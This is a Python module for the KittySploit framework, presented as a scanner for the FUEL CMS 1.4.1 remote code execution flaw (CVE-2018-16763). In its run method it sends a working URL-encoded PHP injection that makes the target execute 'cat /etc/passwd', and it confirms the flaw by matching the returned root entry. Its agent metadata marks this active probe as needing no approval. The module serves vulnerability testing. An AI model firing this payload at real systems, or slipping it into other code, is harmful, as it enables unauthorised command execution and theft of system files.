#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FUEL CMS 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'FUEL CMS 1.4.1 - Remote Code Execution Detection',
        'description': 'FUEL CMS 1.4.1 allows PHP Code Evaluation via the pages/select/ filter parameter or the preview/ data parameter.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'fuelcms', 'rce', 'edb', 'thedaylightstudio', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/47138',
            'https://www.getfuelcms.com/',
            'https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-16763',
            'https://github.com/daylightstudio/FUEL-CMS/issues/478',
        ],
        'cve': 'CVE-2018-16763',
    }

    def run(self):
        path = '/fuel/pages/select/?filter=%27%2bpi(print(%24a%3d%27system%27))%2b%24a(%27cat%20/etc/passwd%27)%2b%27'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='FUEL CMS 1.4.1 - Remote Code Execution detected', path=path)
            return True
        return False

